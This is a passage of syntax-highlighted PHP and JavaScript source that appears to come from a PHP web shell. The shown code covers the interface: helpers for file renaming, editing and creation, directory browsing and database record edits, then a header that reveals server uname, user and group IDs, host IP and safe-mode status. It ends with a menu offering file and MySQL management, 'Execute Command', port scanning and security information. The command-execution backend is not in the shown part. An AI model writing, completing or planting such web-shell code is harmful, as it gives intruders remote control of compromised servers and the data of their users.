<span style="background-color: #003f8e;"> </span>   <span style="color: #ff9da4; font-weight: bold;">newfilename</span> = <span style="color: #ffffff; background-color: #002451;">prompt(</span><span style="color: #99ffff;">'Former file name:'</span>+<span style="color: #ff9da4; font-weight: bold;">oldname</span>+<span style="color: #99ffff;">'\nPlease input new filenam</span><span style="color: #99ffff; text-decoration: underline;">e:'</span><span style="text-decoration: underline;">, </span><span style="color: #99ffff; text-decoration: underline;">''</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (!<span style="color: #ff9da4; font-weight: bold;">newfilename</span>) <span style="color: #d1f1a9;">return</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'rename'</span>).<span style="color: #ff9da4; font-weight: bold;">newfilename</span>.<span style="color: #ff9da4; font-weight: bold;">value</span>=<span style="color: #ff9da4; font-weight: bold;">newfilename</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'rename'</span>).<span style="color: #ff9da4; font-weight: bold;">oldname</span>.<span style="color: #ff9da4; font-weight: bold;">value</span>=<span style="color: #ff9da4; font-weight: bold;">oldname</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'rename'</span>).<span style="color: #ffffff; background-color: #002451;">submit(</span>);
}
<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">dofile</span>(<span style="color: #ff9da4; font-weight: bold;">doing</span>,<span style="color: #ff9da4; font-weight: bold;">thefile</span>,<span style="color: #ff9da4; font-weight: bold;">m</span>){
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (<span style="color: #ff9da4; font-weight: bold;">m</span> &amp;&amp; !<span style="color: #ffffff; background-color: #002451;">confirm(</span><span style="color: #ff9da4; font-weight: bold;">m</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">return</span>;
<span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'filelist'</span>).<span style="color: #ff9da4; font-weight: bold;">doing</span>.<span style="color: #ff9da4; font-weight: bold;">value</span>=<span style="color: #ff9da4; font-weight: bold;">doing</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (<span style="color: #ff9da4; font-weight: bold;">thefile</span>){
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'filelist'</span>).<span style="color: #ff9da4; font-weight: bold;">thefile</span>.<span style="color: #ff9da4; font-weight: bold;">value</span>=<span style="color: #ff9da4; font-weight: bold;">thefile</span>;
<span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'filelist'</span>).<span style="color: #ffffff; background-color: #002451;">submit(</span>);
}
<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">createfile</span>(<span style="color: #ff9da4; font-weight: bold;">nowpath</span>){
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">var</span> <span style="color: #ff9da4; font-weight: bold;">filename</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #ff9da4; font-weight: bold;">filename</span> = <span style="color: #ffffff; background-color: #002451;">prompt(</span><span style="color: #99ffff;">'Please input the file name:'</span>, <span style="color: #99ffff;">''</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (!<span style="color: #ff9da4; font-weight: bold;">filename</span>) <span style="color: #d1f1a9;">return</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">opfile(</span><span style="color: #99ffff;">'editfile'</span>,<span style="color: #ff9da4; font-weight: bold;">nowpath</span> + <span style="color: #ff9da4; font-weight: bold;">filename</span>,<span style="color: #ff9da4; font-weight: bold;">nowpath</span>);
}
<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">opfile</span>(<span style="color: #ff9da4; font-weight: bold;">action</span>,<span style="color: #ff9da4; font-weight: bold;">opfile</span>,<span style="color: #ff9da4; font-weight: bold;">dir</span>){
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'fileopform'</span>).<span style="color: #ff9da4; font-weight: bold;">action</span>.<span style="color: #ff9da4; font-weight: bold;">value</span>=<span style="color: #ff9da4; font-weight: bold;">action</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'fileopform'</span>).<span style="color: #ff9da4; font-weight: bold;">opfile</span>.<span style="color: #ff9da4; font-weight: bold;">value</span>=<span style="color: #ff9da4; font-weight: bold;">opfile</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'fileopform'</span>).<span style="color: #ff9da4; font-weight: bold;">dir</span>.<span style="color: #ff9da4; font-weight: bold;">value</span>=<span style="color: #ff9da4; font-weight: bold;">dir</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'fileopform'</span>).<span style="color: #ffffff; background-color: #002451;">submit(</span>);
}
<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">godir</span>(<span style="color: #ff9da4; font-weight: bold;">dir</span>,<span style="color: #ff9da4; font-weight: bold;">view_writable</span>){
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (<span style="color: #ff9da4; font-weight: bold;">view_writable</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'godir'</span>).<span style="color: #ff9da4; font-weight: bold;">view_writable</span>.<span style="color: #ff9da4; font-weight: bold;">value</span>=<span style="color: #ff9da4; font-weight: bold;">view_writable</span>;
<span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'godir'</span>).<span style="color: #ff9da4; font-weight: bold;">dir</span>.<span style="color: #ff9da4; font-weight: bold;">value</span>=<span style="color: #ff9da4; font-weight: bold;">dir</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'godir'</span>).<span style="color: #ffffff; background-color: #002451;">submit(</span>);
}
<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">getsize</span>(<span style="color: #ff9da4; font-weight: bold;">getdir</span>,<span style="color: #ff9da4; font-weight: bold;">dir</span>){
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'getsize'</span>).<span style="color: #ff9da4; font-weight: bold;">getdir</span>.<span style="color: #ff9da4; font-weight: bold;">value</span>=<span style="color: #ff9da4; font-weight: bold;">getdir</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'getsize'</span>).<span style="color: #ff9da4; font-weight: bold;">dir</span>.<span style="color: #ff9da4; font-weight: bold;">value</span>=<span style="color: #ff9da4; font-weight: bold;">dir</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'getsize'</span>).<span style="color: #ffffff; background-color: #002451;">submit(</span>);
}
<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">editrecord</span>(<span style="color: #ff9da4; font-weight: bold;">action</span>, <span style="color: #ff9da4; font-weight: bold;">base64</span>, <span style="color: #ff9da4; font-weight: bold;">tablename</span>){
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (<span style="color: #ff9da4; font-weight: bold;">action</span> == <span style="color: #99ffff;">'del'</span>) {<span style="color: #ff9da4; background-color: #003f8e;">      </span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (!<span style="color: #ffffff; background-color: #002451;">confirm(</span><span style="color: #99ffff;">'Is or isn\'t deletion record?'</span>)) <span style="color: #d1f1a9;">return</span>;
<span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'recordlist'</span>).<span style="color: #ff9da4; font-weight: bold;">doing</span>.<span style="color: #ff9da4; font-weight: bold;">value</span>=<span style="color: #ff9da4; font-weight: bold;">action</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'recordlist'</span>).<span style="color: #ff9da4; font-weight: bold;">base64</span>.<span style="color: #ff9da4; font-weight: bold;">value</span>=<span style="color: #ff9da4; font-weight: bold;">base64</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'recordlist'</span>).<span style="color: #ff9da4; font-weight: bold;">tablename</span>.<span style="color: #ff9da4; font-weight: bold;">value</span>=<span style="color: #ff9da4; font-weight: bold;">tablename</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'recordlist'</span>).<span style="color: #ffffff; background-color: #002451;">submit(</span>);
}
<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">moddbname</span>(<span style="color: #ff9da4; font-weight: bold;">dbname</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>(!<span style="color: #ff9da4; font-weight: bold;">dbname</span>) <span style="color: #d1f1a9;">return</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'setdbname'</span>).<span style="color: #ff9da4; font-weight: bold;">dbname</span>.<span style="color: #ff9da4; font-weight: bold;">value</span>=<span style="color: #ff9da4; font-weight: bold;">dbname</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'setdbname'</span>).<span style="color: #ffffff; background-color: #002451;">submit(</span>);
}
<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">settable</span>(<span style="color: #ff9da4; font-weight: bold;">tablename</span>,<span style="color: #ff9da4; font-weight: bold;">doing</span>,<span style="color: #ff9da4; font-weight: bold;">page</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>(!<span style="color: #ff9da4; font-weight: bold;">tablename</span>) <span style="color: #d1f1a9;">return</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (<span style="color: #ff9da4; font-weight: bold;">doing</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'settable'</span>).<span style="color: #ff9da4; font-weight: bold;">doing</span>.<span style="color: #ff9da4; font-weight: bold;">value</span>=<span style="color: #ff9da4; font-weight: bold;">doing</span>;
<span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (<span style="color: #ff9da4; font-weight: bold;">page</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'settable'</span>).<span style="color: #ff9da4; font-weight: bold;">page</span>.<span style="color: #ff9da4; font-weight: bold;">value</span>=<span style="color: #ff9da4; font-weight: bold;">page</span>;
<span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'settable'</span>).<span style="color: #ff9da4; font-weight: bold;">tablename</span>.<span style="color: #ff9da4; font-weight: bold;">value</span>=<span style="color: #ff9da4; font-weight: bold;">tablename</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'settable'</span>).<span style="color: #ffffff; background-color: #002451;">submit(</span>);
}
<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">s</span>(<span style="color: #ff9da4; font-weight: bold;">action</span>,<span style="color: #ff9da4; font-weight: bold;">nowpath</span>,<span style="color: #ff9da4; font-weight: bold;">p1</span>,<span style="color: #ff9da4; font-weight: bold;">p2</span>,<span style="color: #ff9da4; font-weight: bold;">p3</span>,<span style="color: #ff9da4; font-weight: bold;">p4</span>,<span style="color: #ff9da4; font-weight: bold;">p5</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>(<span style="color: #ff9da4; font-weight: bold;">action</span>) <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'opform'</span>).<span style="color: #ff9da4; font-weight: bold;">action</span>.<span style="color: #ff9da4; font-weight: bold;">value</span>=<span style="color: #ff9da4; font-weight: bold;">action</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>(<span style="color: #ff9da4; font-weight: bold;">nowpath</span>) <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'opform'</span>).<span style="color: #ff9da4; font-weight: bold;">nowpath</span>.<span style="color: #ff9da4; font-weight: bold;">value</span>=<span style="color: #ff9da4; font-weight: bold;">nowpath</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>(<span style="color: #ff9da4; font-weight: bold;">p1</span>) <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'opform'</span>).<span style="color: #ff9da4; font-weight: bold;">p1</span>.<span style="color: #ff9da4; font-weight: bold;">value</span>=<span style="color: #ff9da4; font-weight: bold;">p1</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>(<span style="color: #ff9da4; font-weight: bold;">p2</span>) <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'opform'</span>).<span style="color: #ff9da4; font-weight: bold;">p2</span>.<span style="color: #ff9da4; font-weight: bold;">value</span>=<span style="color: #ff9da4; font-weight: bold;">p2</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>(<span style="color: #ff9da4; font-weight: bold;">p3</span>) <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'opform'</span>).<span style="color: #ff9da4; font-weight: bold;">p3</span>.<span style="color: #ff9da4; font-weight: bold;">value</span>=<span style="color: #ff9da4; font-weight: bold;">p3</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>(<span style="color: #ff9da4; font-weight: bold;">p4</span>) <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'opform'</span>).<span style="color: #ff9da4; font-weight: bold;">p4</span>.<span style="color: #ff9da4; font-weight: bold;">value</span>=<span style="color: #ff9da4; font-weight: bold;">p4</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>(<span style="color: #ff9da4; font-weight: bold;">p5</span>) <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'opform'</span>).<span style="color: #ff9da4; font-weight: bold;">p4</span>.<span style="color: #ff9da4; font-weight: bold;">value</span>=<span style="color: #ff9da4; font-weight: bold;">p5</span>;
}
<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">g</span>(<span style="color: #ff9da4; font-weight: bold;">action</span>,<span style="color: #ff9da4; font-weight: bold;">nowpath</span>,<span style="color: #ff9da4; font-weight: bold;">p1</span>,<span style="color: #ff9da4; font-weight: bold;">p2</span>,<span style="color: #ff9da4; font-weight: bold;">p3</span>,<span style="color: #ff9da4; font-weight: bold;">p4</span>,<span style="color: #ff9da4; font-weight: bold;">p5</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>(!<span style="color: #ff9da4; font-weight: bold;">action</span>) <span style="color: #d1f1a9;">return</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">s(</span><span style="color: #ff9da4; font-weight: bold;">action</span>,<span style="color: #ff9da4; font-weight: bold;">nowpath</span>,<span style="color: #ff9da4; font-weight: bold;">p1</span>,<span style="color: #ff9da4; font-weight: bold;">p2</span>,<span style="color: #ff9da4; font-weight: bold;">p3</span>,<span style="color: #ff9da4; font-weight: bold;">p4</span>,<span style="color: #ff9da4; font-weight: bold;">p5</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'opform'</span>).<span style="color: #ffffff; background-color: #002451;">submit(</span>);
}
<span style="color: #bbdaff;">&lt;/script&gt;</span>
<span style="color: #bbdaff;">&lt;/head&gt;</span>
<span style="color: #bbdaff;">&lt;body</span> <span style="color: #bbdaff;">style=</span><span style="color: #99ffff;">"margin:0;table-layout:fixed; word-break:break-all"</span><span style="color: #bbdaff;">&gt;</span>
<span style="color: #ebbbff;">&lt;?php</span>
<span style="color: #ffffff; background-color: #002451;">formhead(array(</span><span style="color: #99ffff;">'name'</span>=<span style="color: #bbdaff;">&gt;</span><span style="color: #99ffff;">'opform'</span>));
<span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'action'</span>, $<span style="color: #ffeead;">action</span>);
<span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'nowpath'</span>, $<span style="color: #ffeead;">nowpath</span>);
<span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'p1'</span>, $<span style="color: #ffeead;">p1</span>);
<span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'p2'</span>, $<span style="color: #ffeead;">p2</span>);
<span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'p3'</span>, $<span style="color: #ffeead;">p3</span>);
<span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'p4'</span>, $<span style="color: #ffeead;">p4</span>);
<span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'p5'</span>, $<span style="color: #ffeead;">p5</span>);
<span style="color: #ffffff; background-color: #002451;">formfoot(</span>);

<span style="color: #d1f1a9;">if</span>(!<span style="color: #ffffff; background-color: #002451;">function_exists(</span><span style="color: #99ffff;">'posix_getegid'</span>)) {
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">user</span> = @<span style="color: #ffffff; background-color: #002451;">get_current_user(</span>);
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">uid</span> = @<span style="color: #ffffff; background-color: #002451;">getmyuid(</span>);
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">gid</span> = @<span style="color: #ffffff; background-color: #002451;">getmygid(</span>);
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">group</span> = <span style="color: #99ffff;">"?"</span>;
} <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">uid</span> = @<span style="color: #ffffff; background-color: #002451;">posix_getpwuid(</span>@<span style="color: #ffffff; background-color: #002451;">posix_geteuid(</span>));
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">gid</span> = @<span style="color: #ffffff; background-color: #002451;">posix_getgrgid(</span>@<span style="color: #ffffff; background-color: #002451;">posix_getegid(</span>));
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">user</span> = $<span style="color: #ffeead;">uid</span>[<span style="color: #99ffff;">'name'</span>];
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">uid</span> = $<span style="color: #ffeead;">uid</span>[<span style="color: #99ffff;">'uid'</span>];
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">group</span> = $<span style="color: #ffeead;">gid</span>[<span style="color: #99ffff;">'name'</span>];
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">gid</span> = $<span style="color: #ffeead;">gid</span>[<span style="color: #99ffff;">'gid'</span>];
}

<span style="color: #ebbbff;">?&gt;</span>
<span style="color: #bbdaff;">&lt;table</span> <span style="color: #bbdaff;">width=</span><span style="color: #99ffff;">"100%"</span> <span style="color: #bbdaff;">border=</span><span style="color: #99ffff;">"0"</span> <span style="color: #bbdaff;">cellpadding=</span><span style="color: #99ffff;">"0"</span> <span style="color: #bbdaff;">cellspacing=</span><span style="color: #99ffff;">"0"</span><span style="color: #bbdaff;">&gt;</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #bbdaff;">&lt;tr</span> <span style="color: #bbdaff;">class=</span><span style="color: #99ffff;">"head"</span><span style="color: #bbdaff;">&gt;</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #bbdaff;">&lt;td&gt;&lt;span</span> <span style="color: #bbdaff;">style=</span><span style="color: #99ffff;">"float:right;"</span><span style="color: #bbdaff;">&gt;</span><span style="color: #ebbbff;">&lt;?php</span> <span style="color: #d1f1a9;">echo</span> @<span style="color: #ffffff; background-color: #002451;">php_uname(</span>);<span style="color: #ebbbff;">?&gt;</span> / <span style="color: #ff9da4; font-weight: bold;">User</span>:<span style="color: #ebbbff;">&lt;?php</span> <span style="color: #d1f1a9;">e</span><span style="color: #d1f1a9; text-decoration: underline;">cho</span><span style="text-decoration: underline;"> $</span><span style="color: #ffeead; text-decoration: underline;">uid</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">' ( '</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">user</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">' ) / Group: '</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">gid</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">' ( '</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">group</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">' )'</span><span style="text-decoration: underline;">;</span><span style="color: #ebbbff; text-decoration: underline;">?&gt;</span><span style="color: #bbdaff; text-decoration: underline;">&lt;/span&gt;</span><span style="color: #ebbbff; text-decoration: underline;">&lt;?php</span><span style="text-decoration: underline;"> </span><span style="color: #d1f1a9; text-decoration: underline;">echo</span><span style="text-decoration: underline;"> $</span><span style="color: #bbdaff; text-decoration: underline;">_SERVER</span><span style="text-decoration: underline;">[</span><span style="color: #99ffff; text-decoration: underline;">'HTTP_HOST'</span><span style="text-decoration: underline;">];</span><span style="color: #ebbbff; text-decoration: underline;">?&gt;</span><span style="text-decoration: underline;"> (</span><span style="color: #ebbbff; text-decoration: underline;">&lt;?php</span><span style="text-decoration: underline;"> </span><span style="color: #d1f1a9; text-decoration: underline;">echo</span><span style="text-decoration: underline;"> </span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">gethostbyname(</span><span style="text-decoration: underline;">$</span><span style="color: #bbdaff; text-decoration: underline;">_SERVER</span><span style="text-decoration: underline;">[</span><span style="color: #99ffff; text-decoration: underline;">'SERVER_NAME'</span><span style="text-decoration: underline;">]);</span><span style="color: #ebbbff; text-decoration: underline;">?&gt;</span><span style="text-decoration: underline;">)</span><span style="color: #bbdaff; text-decoration: underline;">&lt;/td&gt;</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #bbdaff;">&lt;/tr&gt;</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #bbdaff;">&lt;tr</span> <span style="color: #bbdaff;">class=</span><span style="color: #99ffff;">"alt1"</span><span style="color: #bbdaff;">&gt;</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #bbdaff;">&lt;td&gt;</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #bbdaff;">&lt;span</span> <span style="color: #bbdaff;">style=</span><span style="color: #99ffff;">"float:right;"</span><span style="color: #bbdaff;">&gt;</span><span style="color: #ff9da4; font-weight: bold;">PHP</span> <span style="color: #ebbbff;">&lt;?php</span> <span style="color: #d1f1a9;">echo</span> <span style="color: #bbdaff;">PHP_VERSION</span>;<span style="color: #ebbbff;">?&gt;</span> / <span style="color: #ff9da4; font-weight: bold;">Safe</span> <span style="color: #ff9da4; font-weight: bold;">Mode</span><span style="text-decoration: underline;">:</span><span style="color: #ebbbff; text-decoration: underline;">&lt;?php</span><span style="text-decoration: underline;"> </span><span style="color: #d1f1a9; text-decoration: underline;">echo</span><span style="text-decoration: underline;"> </span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">getcfg(</span><span style="color: #99ffff; text-decoration: underline;">'safe_mode'</span><span style="text-decoration: underline;">);</span><span style="color: #ebbbff; text-decoration: underline;">?&gt;</span><span style="color: #bbdaff; text-decoration: underline;">&lt;/span&gt;</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #bbdaff;">&lt;a</span> <span style="color: #bbdaff;">href=</span><span style="color: #99ffff;">"javascript:g('logout');"</span><span style="color: #bbdaff;">&gt;</span><span style="color: #ff9da4; font-weight: bold;">Logout</span><span style="color: #bbdaff;">&lt;/a&gt;</span> |<span style="color: #ff9da4; background-color: #003f8e;"> </span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #bbdaff;">&lt;a</span> <span style="color: #bbdaff;">href=</span><span style="color: #99ffff;">"javascript:g('file');"</span><span style="color: #bbdaff;">&gt;</span><span style="color: #ff9da4; font-weight: bold;">File</span> <span style="color: #ff9da4; font-weight: bold;">Manager</span><span style="color: #bbdaff;">&lt;/a&gt;</span> |<span style="color: #ff9da4; background-color: #003f8e;"> </span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #bbdaff;">&lt;a</span> <span style="color: #bbdaff;">href=</span><span style="color: #99ffff;">"javascript:g('mysqladmin');"</span><span style="color: #bbdaff;">&gt;</span><span style="color: #ff9da4; font-weight: bold;">MYSQL</span> <span style="color: #ff9da4; font-weight: bold;">Manager</span><span style="color: #bbdaff;">&lt;/a&gt;</span> |<span style="color: #ff9da4; background-color: #003f8e;"> </span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #bbdaff;">&lt;a</span> <span style="color: #bbdaff;">href=</span><span style="color: #99ffff;">"javascript:g('sqlfile');"</span><span style="color: #bbdaff;">&gt;</span><span style="color: #ff9da4; font-weight: bold;">MySQL</span> <span style="color: #ff9da4; font-weight: bold;">Upload</span> &amp;<span style="color: #ff9da4; font-weight: bold;">amp</span>; <span style="color: #ff9da4; font-weight: bold;">Download</span><span style="color: #bbdaff;">&lt;/a&gt;</span> |<span style="color: #ff9da4; background-color: #003f8e; text-decoration: underline;"> </span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #bbdaff;">&lt;a</span> <span style="color: #bbdaff;">href=</span><span style="color: #99ffff;">"javascript:g('shell');"</span><span style="color: #bbdaff;">&gt;</span><span style="color: #ff9da4; font-weight: bold;">Execute</span> <span style="color: #ff9da4; font-weight: bold;">Command</span><span style="color: #bbdaff;">&lt;/a&gt;</span> |<span style="color: #ff9da4; background-color: #003f8e;"> </span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #bbdaff;">&lt;a</span> <span style="color: #bbdaff;">href=</span><span style="color: #99ffff;">"javascript:g('phpenv');"</span><span style="color: #bbdaff;">&gt;</span><span style="color: #ff9da4; font-weight: bold;">PHP</span> <span style="color: #ff9da4; font-weight: bold;">Variable</span><span style="color: #bbdaff;">&lt;/a&gt;</span> |<span style="color: #ff9da4; background-color: #003f8e;"> </span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #bbdaff;">&lt;a</span> <span style="color: #bbdaff;">href=</span><span style="color: #99ffff;">"javascript:g('portscan');"</span><span style="color: #bbdaff;">&gt;</span><span style="color: #ff9da4; font-weight: bold;">Port</span> <span style="color: #ff9da4; font-weight: bold;">Scan</span><span style="color: #bbdaff;">&lt;/a&gt;</span> |<span style="color: #ff9da4; background-color: #003f8e;"> </span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #bbdaff;">&lt;a</span> <span style="color: #bbdaff;">href=</span><span style="color: #99ffff;">"javascript:g('secinfo');"</span><span style="color: #bbdaff;">&gt;</span><span style="color: #ff9da4; font-weight: bold;">Security</span> <span style="color: #ff9da4; font-weight: bold;">information</span><span style="color: #bbdaff;">&lt;/a&gt;</span> |<span style="color: #ff9da4; background-color: #003f8e;"> </span>
